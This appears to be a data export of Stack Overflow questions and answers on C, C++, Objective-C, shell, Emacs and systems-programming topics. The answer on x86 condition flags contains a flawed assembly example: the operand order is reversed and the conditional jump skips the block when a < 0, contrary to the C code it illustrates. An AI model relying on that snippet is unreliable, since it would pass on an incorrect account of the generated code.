<p>For example, I have an xml file that needs the phrase ""id = $number"" inserted at regular points in the text, and basically, $number++ each time the regex matches (id = 1, id = 2, etc) until the end of the file.</p>

<p>I know I could just write a bash/perl/python script or some such, but I'd like it to be at least moderately user-friendly so I could teach my intelligent (but less technically-inclined) workers how to use it and make their own modifications.  Regexing is not a problem for them.</p>

<p>The closest I've come so far is Notepad++'s Column Editor and 'increase [number] by' function, but with this I have to write a separate regex to align everything, add the increments, and then write another to put it back.  Unfortunately, I need to use this function on too many different types of files and 'replace's to make macros feasible.</p>

<p>Ideally, the program would also be available for both Windows &amp; Linux (WINE is acceptable but native is much preferred), and have a 'VI/VIM input' option (if it's a text editor), but these are of secondary importance.</p>

<p>Of course, it'd be nice if there is an OSS solution, and I'd be glad to donate $20-$50 to the developer(s) if it provides the solution I'm looking for.<br /><br /><br />
Apologies for the length, and thanks so much for your help!</p>
","9530","","<p>emacs (version 22 and later) can do what you're looking for.  See <a href=""http://steve-yegge.blogspot.com/2006/06/shiny-and-new-emacs-22.html"" rel=""nofollow"">Steve Yegge's blog</a> for a really interesting read about it.  I think this should work:</p>

<pre>
M-x replace-regexp
  Replace regexp: <i>insert pattern regexp here</i>
  Replace regexp with: id = \#
</pre>

<p><code>\#</code> is a special metacharacter that gets replaced by the total number of replacements that have occurred so far, starting from 0.  If you want the list to start from 1 instead of 0, use the following replacement string:</p>

<pre>id = \,(1+ \#)</pre>
"
"<p>Is it ever meaningful whether the order of headers is</p>

<pre><code>A: 1
B: 2
</code></pre>

<p>vs</p>

<pre><code>B:2
A:1
</code></pre>

<p>I'm trying to figure out if I can use a dictionary to store a list of headers or if it needs to be some kind of list or ordered dictionary.</p>
","9530","","<p>No, it does not matter for headers with different names.  See <a href=""http://tools.ietf.org/html/rfc2616"">RFC 2616</a>, section 4.2:</p>

<blockquote>
  <p>The order in which header fields with differing field names are
     received is not significant. However, it is ""good practice"" to send
     general-header fields first, followed by request-header or response-
     header fields, and ending with the entity-header fields.</p>
</blockquote>

<p>It DOES matter, however, for multiple headers with the same name:</p>

<blockquote>
  <p>Multiple message-header fields with the same field-name MAY be
     present in a message if and only if the entire field-value for that
     header field is defined as a comma-separated list [i.e., #(values)].
     It MUST be possible to combine the multiple header fields into one
     ""field-name: field-value"" pair, without changing the semantics of the
     message, by appending each subsequent field-value to the first, each
     separated by a comma. The order in which header fields with the same
     field-name are received is therefore significant to the
     interpretation of the combined field value, and thus a proxy MUST NOT
     change the order of these field values when a message is forwarded.</p>
</blockquote>
"
"<p>In my C++ program, I need to pull a 64 bit float from an external byte sequence. Is there some way to ensure, at compile-time, that doubles are 64 bits? Is there some other type I should use to store the data instead?</p>

<p>Edit: If you're reading this and <em>actually</em> looking for a way to ensure storage in the IEEE 754 format, have a look at Adam Rosenfield's answer below.</p>
","9530","","<p>In C99, you can just check if the preprocessor symbol <code>__STDC_IEC_559__</code> is defined.  If it is, then you are guaranteed that a <code>double</code> will be an 8-byte value represented with IEEE 754 (also known as IEC 60559) format.  See the C99 standard, Annex F.  I'm not sure if this symbol is available in C++, though.</p>

<pre><code>#ifndef __STDC_IEC_559__
#error ""Requires IEEE 754 floating point!""
#endif
</code></pre>

<p>Alternatively, you can check the predefined constants <code>__DBL_DIG__</code> (should be 15), <code>__DBL_MANT_DIG__</code> (should be 53), <code>__DBL_MAX_10_EXP__</code> (should be 308), <code>__DBL_MAX_EXP__</code> (should be 1024), <code>__DBL_MIN_10_EXP</code> (should be -307), and <code>__DBL_MIN_EXP__</code> (should be -1021).  These should be available in all flavors of C and C++.</p>
"
"<p>I have an exercise to do where I need to code in C, commands equivalent to <strong>cat</strong> and <strong>nl</strong> using only system calls. The system calls given to us are open(), close(), read() and write().</p>

<p>I've already done the ""cat"" equivalent and it seems to be running fine, now I need to do the ""nl"" one but I'm having trouble with how am I going to write line by line.</p>

<p><strong>The idea is to use the less system calls possible.</strong></p>

<p>I know I need to find the '\n' on the buffer and I could do a while to loop through the buffer and find the '\n' position (let's call it X) then write X number of bytes to stdout. </p>

<p>But looping through all chars in the buffer searching for the end of the line doesn't feel right to me, but I have no idea how else could I do this...</p>

<p><strong>IMPORTANT EDIT:</strong><br />
I think some of you are missing the point on my question... I don't need explanations on how to do this, that's not my problem. I know how to do it (or have a very good idea, I just haven't tried it yet). The ""problem"" is that it <em>doesn't feel right</em> to loop through the buffer, file or whatever, char by char, to find the end of the line (no matter how). I'm not saying this is not the answer or that I'm not allowed to do this and that, I'm just talking about what I think. It just seems an odd way to do this, that's all... But if that's the way, than that's the answer to my question.</p>

<p>I apprecite everyone's help though :)</p>
","9530","","<p>You don't actually need to know the location of the <code>'\n'</code> to number the lines.  You just print out the line number (starting with 1), and read characters until you hit a newline <code>'\n</code>'.  Copy each character back to stdout with <code>write()</code>, and if the character is a newline, increment the count of current lines and print that out, too.</p>
"
"<p>I'm using NSUSerDefaults to store user preferences. I remember reading somewhere that setting the keys as constants is a good idea - and I agree. The following code is what I currently have:</p>

<pre><code>[[NSUserDefaults standardUserDefaults]
        setObject:[NSNumber numberWithInt:polygon.numberOfSides] 
           forKey:@""polygonNumberOfSides""];
</code></pre>

<p>I tried changing this to:</p>

<pre><code>@implementation Controller

NSString const *kPolygonNumberOfSides = @""polygonNumberOfSides"";

-(void)savePolygonInfo {
    [[NSUserDefaults standardUserDefaults]
            setObject:[NSNumber numberWithInt:polygon.numberOfSides] 
               forKey:kPolygonNumberOfSides];
}
</code></pre>

<p>While this does work, it produces ""<code>warning: passing argument 1 of 'objectForKey:' discards qualifiers from pointer target type</code>"". I'm keen to keep my code free from compiler warnings. How can I fix this warning?</p>
","9530","","<p>Don't use <code>const</code> with Objective-C objects, they weren't really designed to use it.  <code>NSString</code> objects (among many others) are already immutable by default by virtue of their design, so making them <code>const</code> is useless.</p>

<p>As <a href=""http://stackoverflow.com/questions/753755/using-a-constant-nsstring-as-the-key-for-nsuserdefaults/753821#753821"">e.James suggested</a>, you can use an <code>NSString * const</code>, which is a constant pointer to an <code>NSString</code>.  This is subtly different from a <code>const NSString *</code> (equivalent to <code>NSString const *</code>), which is a pointer to a constant <code>NSString</code>.  Using a <code>NSString * const</code> prevents you from reassigning <code>kPoly</code> to point to a new <code>NSString</code> object.</p>
"
"<p>I'd like to do a search for folders/directories from java, and go into those folders/directories in java. I guess it's called system utilities? Any tutorials out there, or books on the subject?</p>

<p>Thanks ;)</p>
","9530","","<p>I don't know of any tutorials or books on that particular subject, but the way to do it is to use the <a href=""http://java.sun.com/javase/6/docs/api/java/io/File.html"" rel=""nofollow""><code>java.io.File</code></a> class.  For example, you can use the <a href=""http://java.sun.com/javase/6/docs/api/java/io/File.html#list%28%29"" rel=""nofollow""><code>list()</code></a> to get a list of the contents of a directory.  Then it's just a matter of using <code>isDirectory()</code> and recursing to search an entire file tree.</p>
"
"<p>I have a line of code that is cause a ""EXC_BAD_ACCESS"" error. The line of code is as follows (formatted into one line and nested code removed for ease of reading).</p>

<pre><code>if (![sendData isEqualToString:@""-""]){ ... }
</code></pre>

<p>The actual error occurs on the IF line. the odd thing is that if I put a breakpoint on that line, the NSString called sendData (shown as NSCFString with a value of ""-"" without the quotes). Why would this be causing an error? Please advise.</p>
","9530","","<p>It sounds like you're trying to send a message to an object whose memory has been deallocated.  Make sure you're following the proper memory management techniques discussed in the <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/index.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a>.  The fix would probably be to add a <code>[sendData retain]</code> at some point before it gets deallocated, but to understand why that works, you have to read the aforementioned guide.</p>
"
"<p>I'm using a fairly new install of Visual C++ 2008 Express.</p>

<p>I'm trying to compile a program that uses the log2 function, which was found by including  using Eclipse on a Mac, but this Windows computer can't find the function (error C3861: 'log2': identifier not found).</p>

<p>The way I understood it, include directories are specific to the IDE, right? math.h is not present in my Microsoft SDKs\Windows\v6.0A\Include\ directory, but I did find a math.h in this directory: Microsoft Visual Studio 9.0\VC\include. There is also a cmath in that directory...</p>

<p>Where is log2?</p>
","9530","","<p><code>log2()</code> is only defined in the C99 standard, not the C90 standard.  Microsoft Visual C++ is not fully C99 compliant (heck, there isn't a single fully C99 compliant compiler in existence, I believe -- not even GCC fully supports it), so it's not required to provide <code>log2()</code>.</p>
"
"<p>What are the differences between debug and release builds for a Cocoa application?
I know the debug version contains additional information for debugging but what else is different?</p>
","9530","","<p>Debug builds will contain debugging symbols which can be used by a debugger.  Release builds often do not contain debugging symbols, so if you get a crash dump, all you'll get are a bunch of hexadecimal addresses instead of useful symbol names.</p>

<p>Debug builds are not compiled with optimization (<code>-O0</code> with gcc), whereas release builds are compiled with optimization (typically <code>-O2</code> or <code>-O3</code>).  Optimization makes debugging much, much harder.  If you attempt to debug a release application, the debugger will get very confused, since assembly statements no longer match up with HLL statements, statements get reordered, functions get inlined, loops get unrolled, etc.</p>

<p>Debug and release builds also defined different preprocessor symbols, and some code is conditionally compiled based on those (for example, array bounds checks, assertions, etc.), although that is highly application-dependent.  A typical example would be to <code>#define NDEBUG</code> for release mode, which causes assertions to be removed.</p>
"
"<p>I'm developing a game for the iPhone at the moment and I'd like to offer the player the option to submit their high scores to my server. The gameplay itself does not require internet connectivity.</p>

<p>What's the best way to handle this, just make the request and fail gracefully if there's no internet connection, or is there an API to request that the user connects to the internet?</p>

<p>I'm using NSURLRequest and NSURLConnection to submit the data.</p>

<p>I've searched the Apple docs and the only thing I've come across is the flag for the persistent wifi connection but that seems like overkill.</p>

<p>Any help is appreciated.</p>
","9530","","<p>Check out the <a href=""http://developer.apple.com/iphone/library/samplecode/Reachability/index.html"" rel=""nofollow"">Reachability sample</a>.  It has a bunch of functions for testing network connectivity.</p>
"
"<p>I was changing my for loop to increment using <code>++i</code> instead of <code>i++</code> and got to thinking, is this really necessary anymore?  Surely today's compilers do this optimization on their own.  </p>

<p>In this article, <a href=""http://leto.net/docs/C-optimization.php"">http://leto.net/docs/C-optimization.php</a>, from 1997 Michael Lee goes into other optimizations such as inlining, loop unrolling, loop jamming, loop inversion, strength reduction, and many others.  Are these still relevant?</p>

<p><strong>What low level code optimizations should we be doing, and what optimizations can we safely ignore?</strong></p>

<p>Edit: This has nothing to do with premature optimization. <strong>The decision to optimize has already been made.</strong> Now the question is what is the most effective way to do it.</p>

<p>anecdote: I once reviewed a requirements spec that stated: ""The programmer shall left shift by one instead of multiplying by 2"".</p>
","9530","","<p>All of the optimizations you listed are practically irrelevant these days for C programmers -- the compiler is much, <em>much</em> better at performing things like inlining, loop unrolling, loop jamming, loop inversion, and strength reduction.</p>

<p>Regarding <code>++i</code> versus <code>i++</code>: for integers, they generate identical machine code, so which one you use is a matter of style/preference.  In C++, objects can overload those pre- and postincrement operators, in which case it's usually preferable to use a preincrement, because a postincrement necessitates an extra object copy.</p>

<p>As for using shifts instead of multiplications by powers of 2, again, the compiler already does that for you.  Depending on the architecture, it can do even more clever things, such as turning a multiplication by 5 into a single <code>lea</code> instruction on x86.  However, with divisions and moduli by powers of 2, you might need to pay a little more attention to get the optimal code.  Suppose you write:</p>

<pre><code>x = y / 2;
</code></pre>

<p>If <code>x</code> and <code>y</code> are signed integers, the compiler can't turn that into a right shift because it will yield an erroneous result for negative numbers.  So it, emits a right shift and some bit twiddling instructions to make sure the result is correct for both positive and negative numbers.  If you know <code>x</code> and <code>y</code> are always positive, then you should help the compiler out and make them unsigned integers instead.  Then, the compiler can optimize it into a single right shift instruction.</p>

<p>The modulus operator <code>%</code> works similarly -- if you're modding by a power of 2, with signed integers the compiler has to emit an <code>and</code> instruction plus a little more bit twiddling to make the result correct for positive and negative numbers, but it can emit a single <code>and</code> instruction if dealing with unsigned numbers.</p>
"
"<p>I have been spending time learning how to use the iPhone SDK. I've read ""<a href=""http://books.google.com/books?id=WV9glgdrrrUC&amp;printsec=frontcover&amp;dq=Beginning%2BiPhone%2Bdevelopment"">Beginning iPhone Development: Exploring the iPhone SDK</a>"" from cover to cover and I've never seen an example of multiple views within one XIB. </p>

<p>To illustrate what I mean, here is a screen shot of a XIB with the simple configuration of what I'm referring to:</p>

<p><img src=""http://theopensourceu.com/wp-content/uploads/2009/04/one-xib-multiple-views.png"" alt=""alt text"" /></p>

<p>I figure that there has to be a very specific reason that I've never seen this. In Apple's examples and in all of my readings thus far, multiple XIBs are used with only a single 'view' (and sometimes the Navigation Controller or a Tab Bar Controller, etc). What is the reason for this? Should I avoid multiple views inside a XIB? What are the advantages or disadvantages to to either method? </p>

<p>Thank you in advance</p>
","9530","","<p>It's a question of memory optimization and loading times.  If you put all your views in one XIB, then when your application launches, it has to load the entire XIB into memory and construct all of the objects for all of the controls, and this takes a non-trivial amount of time.</p>

<p>If instead you separate your views into separate XIBs, then your app will start up much faster, because only the XIB containing the initial view will be loaded, and it will also use less memory at first.  Then, when the view changes, you can load the XIB containing the new view lazily.  This will incur a minor hitch when opening a view for the first time.  If you're <em>really</em> trying to optimize memory use, you can also unload the previous view when switching views, but I wouldn't recommend this, as this will incur a hitch every time you switch views, instead of just the first time you switch to any given view.</p>
"
"<p>I need to check if some number of years have been since some date. Currently I've got <code>timedelta</code> from <code>datetime</code> module and I don't know how to convert it to years.</p>
","9530","","<p>If you're trying to check if someone is 18 years of age, using <code>timedelta</code> will not work correctly on some edge cases because of leap years.  For example, someone born on January 1, 2000, will turn 18 exactly 6575 days later on January 1, 2018 (5 leap years included), but someone born on January 1, 2001, will turn 18 exactly 6574 days later on January 1, 2019 (4 leap years included).  Thus, you if someone is exactly 6574 days old, you can't determine if they are 17 or 18 without knowing a little more information about their birthdate.</p>

<p>The correct way to do this is to calculate the age directly from the dates, by subtracting the two years, and then subtracting one if the current month/day precedes the birth month/day.</p>
"
"<p>So I have have a directory - lets say /dir/.
In it I have these folders-
/dir/fold1/
/dir/fold2/
/dir/fold3/</p>

<p>each of these folders (fold1,2,3) may contain a folder called foo. I want to list all the folders inside dir, that have inside them a folder called foo.</p>

<p>Thanks!</p>
","9530","","<p>If you want to list all of the directories which only contain a subdirectory named <code>foo</code> at the first level, you can do</p>

<pre><code>for x in /dir/*; do
  [ -d $x/foo ] &amp;&amp; ls $x
done
</code></pre>

<p>The <code>[ ... ]</code> construct is an abbreviation for the shell built-in <code>test</code>.  <code>-d $x/foo</code> tests if the <code>$x/foo</code> exists and is a directory.  If it does, then <code>ls $x</code> is executed.</p>
"
"<p>Some compilers let you set warnings as errors, so that you'll never leave any compiler warnings behind, because if you do, the code won't build. This is a Good Thing.</p>

<p>Unfortunately, some compilers <em>don't</em> have a flag for warnings-as-errors.</p>

<p>I need to write a shell script or wrapper that provides the feature.</p>

<p>Presumably it parses the compilation console output and returns failure if there were any compiler warnings (<em>or errors</em>), and success otherwise. ""Failure"" also means (I think) that object code should not be produced.</p>

<p>What's the shortest, simplest UNIX/Linux shell script you can write that meets the explicit requirements above, as well as the following implicit requirements of otherwise behaving just like the compiler: 
- accepts all flags, options, arguments
- supports redirection of stdout and stderr
- produces object code and links as directed</p>

<p>Key words: elegant, meets <em>all</em> requirements.</p>

<p>Extra credit: easy to incorporate into a GNU make file.</p>

<p>Thanks for your help.</p>

<p>=== Clues ===
This solution to a different problem, using shell functions (?), <a href=""http://stackoverflow.com/questions/420278/append-text-to-stderr-redirects-in-bash"">Append text to stderr redirects in bash</a>, might figure in. Wonder how to invite <a href=""http://stackoverflow.com/users/34509/litb"">litb</a>'s friend ""who knows bash quite well"" to address my question?</p>

<p>=== Answer status ===</p>

<p>Thanks to <a href=""http://stackoverflow.com/users/35092/charlie-martin"">Charlie Martin</a> for the short answer, but that, unfortunately, is what I started out with. A while back I used that, released it for office use, and, within a few hours, had its most severe drawback pointed out to me: it will PASS a compilation with no warnings, but only errors. That's really bad because then we're delivering object code that the compiler is <em>sure</em> won't work. The simple solution also doesn't meet the other requirements listed.</p>

<p>Thanks to <a href=""http://stackoverflow.com/users/9530/adam-rosenfield"">Adam Rosenfield</a> for the shorthand, and <a href=""http://stackoverflow.com/users/29759/chris-dodd"">Chris Dodd</a> for introducing pipefail to the solution. <em>Chris'</em> answer looks closest, because I think the pipefail should ensure that if compilation actually fails on error, that we'll get failure as we should. Chris, does pipefail work in all shells? And have any ideas on the rest of the implicit requirements listed above?</p>
","9530","","<p>This should do the trick:</p>

<pre><code>$ if compile-command |&amp; tee /dev/tty | grep -q 'Warning'; then false; else true; fi
</code></pre>

<p>The <code>|&amp;</code> construct is shorthand for <code>2&gt;&amp;1 |</code> (that is, it redirects both <code>stdout</code> and <code>stderr</code> into the pipeline).  Putting <code>tee /dev/tty</code> in the pipeline ensures that you'll still see the compiler's output on the console, and piping it to <code>grep -q 'Warning'</code> will make the exit status 1 if no warnings were found, or 0 if any warnings were found.  Finally, wrapping that in an <code>if ...; then false; else true; fi</code> inverts the exit status, so the exit status is 0 if no warnings were found (success), or 1 if any warnings were found (failure).</p>
"
"<p>It's widely known that the most significant mmap() feature is that file mapping is shared between many processes. But it's not less widely known that every process has its own address space.</p>

<p>The question is where are memmapped files (more specifically, its data) truly kept, and how processes can get access to this memory?
I mean not *(pa+i) and other high-level stuff, but I mean the internals of the process.</p>
","9530","","<p>This is very implementation-dependent, but the following is one possible implementation:</p>

<p>When a file is a first memory-mapped, the data isn't stored anywhere at first, it's still on disk.  The virtual memory manager (VMM) allocates a range of virtual memory addresses to the process for the file, but those addresses aren't immediately added to the page table.</p>

<p>When the program first tries to read or write to one of those addresses, a <a href=""http://en.wikipedia.org/wiki/Page%5Ffault"" rel=""nofollow"">page fault</a> occurs.  The OS catches the page fault, figures out that that address corresponds to a memory-mapped file, and reads the appropriate disk sector into an internal kernel buffer.  Then, it maps the kernel buffer into the process's address space, and restarts the user instruction that caused the page fault.  If the faulting instruction was a read, we're all done for now.  If it was a write, the data is written to memory, and the page is marked as dirty.  Subsequent reads or writes to data within the same page do not require reading/writing to/from disk, since the data is in memory.</p>

<p>When the file is flushed or closed, any pages which have been marked dirty are written back to disk.</p>

<p>Using memory-mapped files is advantageous for programs which read or write disk sectors in a very haphazard manner.  You only read disk sectors which are actually used, instead of reading the entire file.</p>
"
"<p>Quick question about the theory of GCing.  I have the following method.  It runs, and exits the method.  How come even after GC is run, the timer still exists and keeps ""TICK""ing?  I don't believe there's still a reference to timer or the timertask anymore after this method exists, so I'd expect the timer to be GCed and cause an exception.  Please help me understand this concept.</p>

<p>Thanks,
jbu</p>

<pre><code>private void startTimer()
    {
        Timer timer= new Timer();
        TimerTask timerTask= new TimerTask()
        {

            @Override
            public void run()
            {
                System.out.println(""TICK"");
            }
        };

        timer.scheduleAtFixedRate(timerTask,
                0,
                500);
    }
</code></pre>
","9530","","<p>The timer's not being garbage collected because it's still running -- some other object (such as the thread scheduler) still has a reference to it, which was probably created inside <code>scheduleAtFixedRate()</code>.</p>
"
"<p>I have a simple wrapper for an Mersenne twister random number generator.  The purpose is to scale the number returned by the generator (between 0 and 1) to between argument defined limits (begin and end).</p>

<p>So my function is </p>

<pre><code>inline float xlRandomFloat(float begin, float end) {return (begin+((end-begin)*genrand_real2()));}
</code></pre>

<p>I don't believe the implementation of genrand_real2() function is important, but if I am wrong it can be found <a href=""http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/MT2002/CODES/mt19937ar.c"" rel=""nofollow"">here</a></p>

<p>The problem is the function does not return the translated result.  The scaling (multiplying by (begin-end) seems to work correctly, but the addition of begin does not seem to be returned.</p>

<p>So if I call xlRandomFloat(5,10) - I get values between 0 and 5.</p>

<p>If I debug with GDB, and use the print function then it shows the correct result.
So then I tried separating things into lines to see what happens</p>

<pre><code>inline float xlRandomFloat(float begin, float end) {
    float ret;
    ret=(((end-begin)*genrand_real2()));
    ret+=begin;
    return ret;};
</code></pre>

<p>When debugging, it jumped straight from the first line into the genrand_real2() function and skipped out every thing else entirely.  That was really confusing so I thought it may have something to do with the inlining.
I moved the file from this .hpp file to the .cpp and removed the inline keyword and everything works correctly.</p>

<p>But why does this behavior occur, and how can I inline this function?  Also, I am not sure if this is relevant, but often when I made changes to the sources, my Make compilation would say there is nothing to be done.  Which is unusual since normally I expect make to pick up on changes in the sources and rebuild accordingly.</p>

<p>Any ideas.</p>

<p>Thanks</p>

<p>Zenna</p>
","9530","","<p>Your code is perfectly fine, there must be something wrong with the way you're compiling.  Make sure your Makefile has the proper dependencies: the source files need to depend on the header files that they include.  Tracking these dependencies is rarely done by hand, usually only for very small projects -- they are normally generated by a tool such as <code>makedepend</code>.</p>

<p>To see if inlining is causing the problem, just disable all optimizations by using the <code>-O0</code> (dash capital-oh zero) option with GCC.  Also make sure to enable debugging symbols with <code>-g</code>.</p>
"
"<p>My solution to <a href=""http://mitpress.mit.edu/sicp/full-text/book/book-Z-H-11.html#%%5Fsec%5F1.2.2"" rel=""nofollow"">exercise 1.11</a> of SICP is:</p>

<pre><code>(define (f n)
  (if (&lt; n 3)
   n
   (+ (f (- n 1)) (* 2 (f (- n 2))) (* 3 (f (- n 3))))
   ))
</code></pre>

<p>As expected, a evaluation such as (f 100) takes a long time. I was wondering if there was a way to improve this code (without foregoing the recursion), and/or take advantage of multi-core box. I am using 'mit-scheme'.</p>
","9530","","<p>See <a href=""http://fare.tunes.org/files/fun/fibonacci.lisp"" rel=""nofollow"">this article</a> for a good tutorial on developing a fast Fibonacci function with functional programming.  It uses Common LISP, which is slightly different from Scheme in some aspects, but you should be able to get by with it.  Your implementation is equivalent to the <code>bogo-fig</code> function near the top of the file.</p>
"
"<p>Sometimes a local variable is used for the sole purpose of checking it in an assert(), like so -</p>

<pre><code>int Result = Func();
assert( Result == 1 );
</code></pre>

<p>When compiling code in a Release build, assert()s are usually disabled, so this code may produce a warning about Result being set but never read.</p>

<p>A possible workaround is -</p>

<pre><code>int Result = Func();
if ( Result == 1 )
{
    assert( 0 );
}
</code></pre>

<p>But it requires too much typing, isn't easy on the eyes and causes the condition to be always checked (yes, the compiler may optimize the check away, but still).</p>

<p>I'm looking for an alternative way to express this assert() in a way that wouldn't cause the warning, but still be simple to use and avoid changing the semantics of assert().</p>

<p>(disabling the warning using a #pragma in this region of code isn't an option, and lowering warning levels to make it go away isn't an option either...).</p>
","9530","","<p>You could create another macro that allows you to avoid using a temporary variable:</p>

<pre><code>#ifndef NDEBUG
#define Verify(x) assert(x)
#else
#define Verify(x) ((void)(x))
#endif

// asserts that Func()==1 in debug mode, or calls Func() and ignores return
// value in release mode (any braindead compiler can optimize away the comparison
// whose result isn't used, and the cast to void suppresses the warning)
Verify(Func() == 1);
</code></pre>
"
"<p>I use <a href=""http://en.wikipedia.org/wiki/Emacs"">Emacs</a> v. 22 (the console version, either remotely with <a href=""http://en.wikipedia.org/wiki/PuTTY"">PuTTY</a> or locally with <a href=""http://en.wikipedia.org/wiki/Konsole"">Konsole</a>) as my primary text editor on Linux. It takes a while to load up each time I start it though, probably almost a second, although I never timed it. I tend to open and close Emacs a lot, because I'm more comfortable using the <a href=""http://en.wikipedia.org/wiki/Bash_%28Unix_shell%29"">Bash</a> command-line for file/directory manipulation and compiling.</p>

<p>How can I speed up the start-up time?</p>
","9530","","<p>Check your <code>.emacs</code> file to see if you're loading unnecessary packages.  Loading packages can take a significant amount of time.  For example, you might only want to load the <code>php-mode</code> package if you're editing a PHP file.  You can do that by installing a hook procedure, although I'm not certain of the details.</p>

<p>Also make sure that any packages you're loading are compiled (<code>.elc</code> files).  You can compile an <code>elisp</code> file by running</p>

<pre><code>emacs -batch -f batch-byte-compile thefile.el
</code></pre>

<p>Compiled packages load much faster than uncompiled packages.</p>
"
"<p>Like when you drag a file on top of another one and change the order, like that.</p>
","9530","","<p>I'm going to assume you're asking about how to rearrange the order in which files are displayed in a folder.  I'm not exactly sure how to do it, but you'll want to use the various functions from the Windows <em>shell</em> to accomplish this.  See the <a href=""http://msdn.microsoft.com/en-us/library/bb776778%28VS.85%29.aspx"" rel=""nofollow"">Shell Developer's Guide</a>.</p>
"
"<p>I came across this kind of code once in a while - I suspect the creator is/was afraid that table delete would iterate over the table and ""cost performance"" (which imho will not be done either way)... is there any real benefit one might get/consider/imagine from not using the the table delete here?</p>

<pre><code>myClass** table = new myClass* [size];
... //some code that does not reallocate or change the value of the table pointer ;)
delete table; // no [] intentionally
</code></pre>
","9530","","<p>Not only is there no benefit, the code is just plain wrong -- at best, it leaks memory, and at worst, it can crash your program or open up a hard-to-find security hole.  You must always match <code>new</code> with <code>delete</code> and <code>new[]</code> with <code>delete[]</code>.  Always.</p>
"
"<p>Is it possible using GNU tools (gcc, binutils, etc) to modify all occurrences of an assembly instruction into a no-op? Specifically, gcc with the -pg option generates the following assembly (ARM):</p>

<pre><code>   0x0: e1a0c00d 	mov	ip, sp
   0x4: e92dd800 	stmdb	sp!, {fp, ip, lr, pc}
   0x8: e24cb004 	sub	fp, ip, #4	; 0x4
   0xc: ebfffffe 	bl	0 &lt;mcount&gt;
</code></pre>

<p>I want to record the address of this last instruction, and then change it to a nop like in the following code</p>

<pre><code>   0x0: e1a0c00d 	mov	ip, sp
   0x4: e92dd800 	stmdb	sp!, {fp, ip, lr, pc}
   0x8: e24cb004 	sub	fp, ip, #4	; 0x4
   0xc: e1a00000 	nop			(mov r0,r0)
</code></pre>

<p>The Linux kernel can do something similar to this at run-time, but I'm looking for a build-time solution.</p>
","9530","","<p>You can compile the code with <code>gcc -S</code> to output an assembler listing, instead of compiling fully into an object file or executable.  Then, just replace the desired instructions with no-ops (e.g. using <code>sed</code>), and continue compilation from there.</p>

<p>If you also want to do this for object files or libraries that you don't have the original source code for, you'll instead have to use a tool such as <a href=""http://linux.die.net/man/1/objdump"" rel=""nofollow""><code>objdump(1)</code></a> to disassemble them and get the addresses of the instructions you wish to replace.  Then, parse the object file headers to find the offsets within the file of those instructions, and then replace the machine instructions with no-ops directly in the object files.  This is a little trickier, but doable.</p>
"
"<p>Using nUnit to test the output (currency formatting) for a specific culture but we are getting the following result.</p>

<pre><code>  Fail: Formatting currency amount
  String lengths are both 11. Strings differ at index 2.
  Expected: ""12 765,87 €""
  But was:  ""12 765,87 €""
  -------------^
</code></pre>

<p>We can't see the difference between the strings. Our expected result uses a ""Space"" character.  </p>

<p>Is there a different space character that we can put into the accepted result to get the test to pass?</p>

<p>By the way, the tested culture is fr-FR.</p>

<p>Edit: Thanks Adam you are spot on with the unicode character. We have changed our expected results and now each Unit test passes.</p>
","9530","","<p>It's possible they're different types of spaces.  Unicode has a lot of different <a href=""http://en.wikipedia.org/wiki/Whitespace%5F%28computer%5Fscience%29"">space characters</a>.  Take a look at the code points at index 2 by casting the characters to integers to get your answer.</p>

<p><strong>Edit</strong></p>

<p>In response to your comment, code point 160 is a <a href=""http://en.wikipedia.org/wiki/Non-breaking%5Fspace"">non-breaking space</a>.  You can <a href=""http://en.wikipedia.org/wiki/Unicode%5Finput"">enter it directly</a> into your source code (e.g. Alt+0160 on the numeric keypad on Windows), or use an escape sequence:</p>

<pre><code>// U+20AC is the Unicode code point for the euro sign
string expected = ""12\u00A0765,87 \u20AC"";
</code></pre>
"
"<blockquote>
  <p>suppose we use the <strong>addl</strong>
  instruction to perform the equivalent
  of the C expression ""t=a+b"",where
  a,b,t are variables of type
  <strong>int</strong>,then the conditional code will be set according to the following C
  expression:</p>
  
  <p>CF:  (unsigned t) &lt; (unsigned a)    Unsigned Overflow</p>
  
  <p>ZF:  (t==0)                         Zero</p>
  
  <p>SF:  (t&lt;0)                          Negative</p>
  
  <p>OF:  (a&lt;0 == b&lt;0) &amp;&amp; (t&lt;0 != a&lt;0)   Signed Overflow</p>
</blockquote>

<p>Quted from a computer system textbook.</p>

<ul>
<li>CF is the carry flag.</li>
<li>ZF is the zero flag.</li>
<li>SF is the sign flag.</li>
<li>OF is the overflow flag.</li>
</ul>

<p>i can't figure out why these C expressions have the effect mentioned above.for example,why the expression (t&lt;0) will set the SF flag?? t&lt;0 is either true,or false(since the textbook only told the type of these variables),but why the sign flag has been set?I'm really confused,please help..thanks!</p>
","9530","","<p>CF, ZF, SF, and OF are singular bits within the CC (condition code) register.  There are also other bits which are set under other conditions.  Whenever the CPU executes certain instructions (including <code>add</code> and <code>sub</code>), it sets those bits according to the result of the operation.  The instructions <code>cmp</code> and <code>test</code> function identically to the <code>sub</code> and <code>and</code> instructions respectively, except they completely discard the result, and the only output is the condition flags.</p>

<p>Suppose we have the following C code:</p>

<pre><code>int a, b;
...
a -= b;
if(a &lt; 0)
{
    // stuff...
}
</code></pre>

<p>A naïve compiler might compile this as so:</p>

<pre><code>    ; Suppose a is in the eax register and b is in the edx register
    sub %eax, %edx  ; subtract b from a, store result in a
    cmp $0, %eax    ; compare a to 0
    jl end_of_stuff ; if a &lt; 0, goto end_of_stuff
    ; code for stuff goes here
end_of_stuff:
    ; code after if block goes here
</code></pre>

<p>A smarter compiler, though, would realize that the <code>sub</code> instruction already sets the condition codes, so it could compile it like this:</p>

<pre><code>    sub %eax, %edx
    jl end_of_stuff   ; if a &lt; 0, goto end_of_stuff
    ; code for stuff goes here
end_of_stuff:
    ; code after if block goes here
</code></pre>

<p>Note that the <code>jl</code> instruction (jump if less than) takes the jump if and only if SF ≠ OF.  That is, it jumps if the result is negative and overflow did not occur, or if the result is positive and overflow did occur.  This is necessary to ensure that the correct result is obtained when the difference overflows (e.g. comparing <code>INT_MIN</code> with <code>INT_MAX</code>).</p>
"
"<p>I am using <strong>joySetCapture</strong> with fChanged (4'th parameter) = true.</p>

<p>I am getting the messages only when position is changed, as I should.
However, I am not getting any message when a joystick button is pressed.</p>

<p>If I use fChanged = false, the wParam of the periodic messages is updated correctly.</p>

<p>How can I get messages <em>only</em> when either position or button is changed, without using periodic messages?</p>
